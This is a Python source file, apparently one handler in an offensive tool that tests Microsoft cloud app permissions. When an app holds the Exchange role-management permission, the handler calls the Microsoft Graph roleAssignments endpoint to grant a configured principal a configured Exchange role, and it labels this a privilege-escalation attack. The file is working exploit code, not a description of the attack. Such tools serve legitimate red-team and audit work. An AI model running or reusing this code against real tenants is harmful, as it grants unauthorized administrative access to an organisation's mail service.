from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.exchange_handler')


class Exchange_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "RoleManagement.ReadWrite.Exchange" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to exchange vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "RoleManagementRWExchangeVectors"
            message = ""
            error = "RoleManagementRWExchangeVectors - failed"
            conf = request.attack_config['exchange']
            
            logger.debug("RoleManagement.ReadWrite.Exchange - Allows the app to read and manage the role-based access control (RBAC) settings for your organization's Exchange Online service, without a signed-in user.")
        
            logger.debug("Attack vector - privilege escalation.")         
            try:
                create_message_URL = "https://graph.microsoft.com/beta/roleManagement/exchange/roleAssignments"
                message_obj = {
                    "principalId": conf["princpalId"],
                    "roleDefinitionId": conf["roleId"],
                    "directoryScopeId": "/",
                    "appScopeId": "null"
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 201:
                    message += "%s got role %s \n" % (conf["princpalId"], conf["roleId"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in Exchange_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))       
            
        return super().handle(request,responses)
